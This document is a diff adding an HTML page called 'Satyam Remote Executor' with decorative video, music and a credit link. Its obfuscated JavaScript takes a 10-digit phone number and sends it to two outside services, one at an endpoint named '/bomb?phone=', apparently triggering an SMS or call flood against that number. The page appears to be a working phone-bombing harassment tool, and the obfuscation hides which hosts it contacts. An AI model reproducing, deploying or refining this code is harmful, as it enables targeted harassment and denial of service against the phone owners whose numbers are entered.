@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Satyam Remote Executor</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+    }
+
+    /* Full background video */
+    #bgVideo {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+        z-index: -2;
+    }
+
+    /* Dark overlay */
+    #overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.45);
+        z-index: -1;
+    }
+
+    .container {
+        text-align: center;
+        padding-top: 40px;
+    }
+
+    /* Bigger small video */
+    #smallVideo {
+        width: 300px;        /* bigger width */
+        height: 180px;       /* proportional height */
+        object-fit: cover;   /* fill nicely */
+        border-radius: 12px;
+        border: 2px solid #00ff00;
+        box-shadow: 0 0 15px rgba(0,255,0,0.4);
+        margin-bottom: 25px;
+    }
+
+    /* Changing white/green text */
+    h1 {
+        font-size: 28px;
+        margin-bottom: 20px;
+        animation: colorShift 3s infinite linear;
+    }
+
+    @keyframes colorShift {
+        0%   { color: #ffffff; }
+        50%  { color: #00ff00; }
+        100% { color: #ffffff; }
+    }
+
+    /* Input */
+    input {
+        margin-top: 10px;
+        padding: 12px;
+        font-size: 20px;
+        width: 230px;
+        text-align: center;
+        border-radius: 8px;
+        border: 1px solid #00ff00;
+        background: rgba(0,0,0,0.5);
+        color: #fff;
+    }
+
+    /* Button */
+    button {
+        margin-top: 20px;
+        padding: 12px 28px;
+        font-size: 18px;
+        background: #00ff00;
+        color: #000;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-weight: bold;
+    }
+
+</style>
+</head>
+<body>
+
+<!-- Background -->
+<video id="bgVideo" autoplay muted loop playsinline>
+    <source src="bg.mp4" type="video/mp4">
+</video>
+
+<div id="overlay"></div>
+
+<!-- Music -->
+<audio id="bgMusic">
+    <source src="bg.mp3" type="audio/mpeg">
+</audio>
+
+<div class="container">
+
+    <!-- Bigger top video -->
+    <video id="smallVideo" autoplay muted loop playsinline>
+        <source src="rootx.mp4" type="video/mp4">
+    </video>
+
+    <h1>SATYAM REMOTE EXECUTER</h1>
+
+    <input id="mobile" maxlength="10" placeholder="10 Digit Number">
+
+    <br>
+
+    <button onclick="run()">Execute</button>
+</div>
+<div style="
+    position: fixed;
+    bottom: 12px;
+    width: 100%;
+    text-align: center;
+    color: #00ff00;
+    font-size: 16px;
+    font-weight: bold;
+">
+    <a href="https://satyam-raj-india.github.io/Satyam-Raj/" 
+       style="color:#fff ; text-decoration:none;">
+       Made by ROOTX × SATYAM
+    </a>
+</div>
+<script>
+function _0x39a5(){const _0x52ac67=['1125048GDWMms','6xTtvwg','catch','length','12071196opdeOL','mobile','https://devlyn.cloud/Chut.php/?mobile=','Valid\x2010-digit\x20number\x20only.','1026588zzDnXp','getElementById','&key=SPLEXXO','73555QsFbkt','6753945uJEhyN','https://splexxo1-2api.vercel.app/bomb?phone=','3872608CyySjf','value','7803495FNZxWc','play','bgMusic','8rtGVBx'];_0x39a5=function(){return _0x52ac67;};return _0x39a5();}function _0x44eb(_0x2ea526,_0x4f0f6a){const _0x39a518=_0x39a5();return _0x44eb=function(_0x44ebf9,_0x16c464){_0x44ebf9=_0x44ebf9-0xeb;let _0x144899=_0x39a518[_0x44ebf9];return _0x144899;},_0x44eb(_0x2ea526,_0x4f0f6a);}(function(_0x5cde2f,_0x7e4b82){const _0x5bd7ea=_0x44eb,_0x486b44=_0x5cde2f();while(!![]){try{const _0x417c7a=-parseInt(_0x5bd7ea(0xf0))/0x1+-parseInt(_0x5bd7ea(0xed))/0x2+-parseInt(_0x5bd7ea(0xf9))/0x3*(-parseInt(_0x5bd7ea(0xf8))/0x4)+parseInt(_0x5bd7ea(0xf1))/0x5*(-parseInt(_0x5bd7ea(0xfa))/0x6)+parseInt(_0x5bd7ea(0xf5))/0x7+-parseInt(_0x5bd7ea(0xf3))/0x8+parseInt(_0x5bd7ea(0xfd))/0x9;if(_0x417c7a===_0x7e4b82)break;else _0x486b44['push'](_0x486b44['shift']());}catch(_0x491d0e){_0x486b44['push'](_0x486b44['shift']());}}}(_0x39a5,0xbf7db));function run(){const _0x3734cc=_0x44eb,_0x1a2d13=document[_0x3734cc(0xee)](_0x3734cc(0xf7));_0x1a2d13[_0x3734cc(0xf6)]()[_0x3734cc(0xfb)](()=>{});let _0xaf80f0=document[_0x3734cc(0xee)](_0x3734cc(0xfe))[_0x3734cc(0xf4)];if(_0xaf80f0[_0x3734cc(0xfc)]!==0xa||isNaN(_0xaf80f0)){alert(_0x3734cc(0xec));return;}const _0x61d21d=_0x3734cc(0xeb)+_0xaf80f0,_0x5b82de=_0x3734cc(0xf2)+_0xaf80f0+_0x3734cc(0xef);fetch(_0x61d21d)[_0x3734cc(0xfb)](()=>{}),fetch(_0x5b82de)[_0x3734cc(0xfb)](()=>{}),alert('Triggered\x20for:\x20'+_0xaf80f0);}
+</script>
+
+</body>
+</html>
